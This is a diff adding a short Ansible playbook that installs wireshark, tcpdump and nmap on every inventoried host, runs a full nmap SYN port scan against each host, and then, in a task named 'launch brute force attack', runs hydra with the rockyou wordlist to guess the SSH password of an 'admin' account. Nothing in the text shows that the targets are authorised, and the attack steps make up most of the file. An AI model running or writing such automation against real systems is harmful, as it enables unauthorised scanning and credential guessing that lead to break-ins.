@@ -1,0 +1,21 @@
+- hosts: all
+  become: true
+  tasks:
+    - name: Install wireshark
+      apt:
+        name: wireshark
+        state: present
+    - name: Install tcpdump
+      apt:
+        name: tcpdump
+        state: present
+    - name: Install nmap
+      apt:
+        name: nmap
+        state: present
+    - name: Scan for open ports
+      command: nmap -sS -p- {{ inventory_hostname }}
+      register: nmap_output
+    - name: launch brute force attack
+      command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt {{ inventory_hostname }} ssh"
+      register: brute_force_output
